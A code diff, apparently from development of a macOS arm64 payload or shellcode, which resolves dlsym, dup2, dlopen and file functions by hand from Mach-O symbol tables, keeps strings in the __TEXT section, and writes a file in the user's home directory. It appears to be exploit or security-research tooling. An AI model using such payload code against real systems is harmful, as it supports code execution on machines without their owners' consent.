@@ -9,20 +9,10 @@
 
 void crash(uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7, uint64_t x8, uint64_t x9);
 
-// Check if string is "__TEXT"
-int is__TEXT(char* s) {
-    return s[0] == 95 && s[1] == 95 && s[2] == 84 && s[3] == 69 && s[4] == 88 && s[5] == 84 && s[6] == 0;
-}
+__attribute__((section("__TEXT, __text")))
+uint64_t* array = NULL;
 
-// Check if string is "__LINKEDIT"
-int is__LINKEDIT(char* s) {
-    return s[0] == 95 && s[1] == 95 && s[2] == 76 && s[3] == 73 && s[4] == 78 && s[5] == 75 && s[6] == 69 && s[7] == 68 && s[8] == 73 && s[9] == 84 && s[10] == 0;
-}
-
-// Check if string is "_dlsym"
-int is_dlsym(char* s) {
-    return s[0] == 95 && s[1] == 100 && s[2] == 108 && s[3] == 115 && s[4] == 121 && s[5] == 109 && s[6] == 0;
-}
+#define getString(offset) ((char*)array + 144 + offset)
 
 int same_string(const char *s1, const char *s2) {
     for (int i = 0; s1[i] == s2[i]; i++) {
@@ -42,9 +32,9 @@ uint64_t findSymbol(uint64_t baseAddr, char* wanted_name) {
     for(int i = 0; i < header->ncmds > 0; i++) {
         if (command->cmd == LC_SEGMENT_64) {
             struct segment_command_64* segment = (struct segment_command_64*)command;
-            if (is__TEXT(segment->segname) == 1) {
+            if (same_string(segment->segname, getString(100)) == 1) {
                 slide = baseAddr - segment->vmaddr;
-            } else if (is__LINKEDIT(segment->segname) == 1) {
+            } else if (same_string(segment->segname, getString(107)) == 1) {
                 linkedit = (struct segment_command_64*)command;
             }
         } else if (command->cmd == LC_SYMTAB) {
@@ -65,8 +55,6 @@ uint64_t findSymbol(uint64_t baseAddr, char* wanted_name) {
     }
     return 22;
 }
-
-#define getString(offset) ((char*)array + 144 + offset)
 
 typedef unsigned int (*sleep_func)(unsigned int);
 typedef void* (*malloc_func)(size_t);
@@ -91,9 +79,6 @@ typedef void* (*dlopen_func)(const char*, int);
 #define write(fd, buf, count) ((write_func)array[15])(fd, buf, count)
 #define dup2(oldfd, newfd) ((dup2_func)array[16])(oldfd, newfd)
 #define dlopen(path, mode) ((dlopen_func)array[17])(path, mode)
-
-__attribute__((section("__TEXT, __text")))
-uint64_t* array = NULL;
 
 char* combineStrings(char* str1, char* str2) {
     size_t len1 = strlen(str1);
@@ -124,14 +109,14 @@ int c_start(uint64_t* array_ptr) {
     array[16] = findSymbol(array[4], getString(86)); // _dup2
     array[17] = findSymbol(array[6], getString(92)); // _dlopen
     
-    sleep(10);
-    
-    char* homePath = getenv(getString(100));
-    char* path = combineStrings(homePath, getString(105));
+    char* homePath = getenv(getString(118));
+    char* path = combineStrings(homePath, getString(123));
     int fd = open(path, O_RDWR | O_CREAT | O_TRUNC, 0644);
     if (fd == -1) {
         crash(500,500,500,500,500,500,500,500,500,500);
     }
+    
+    sleep(10);
     
     crash(0,0,array[12],array[13],array[14],array[15],array[16],array[17],array[13],array[14]);
     return 0;
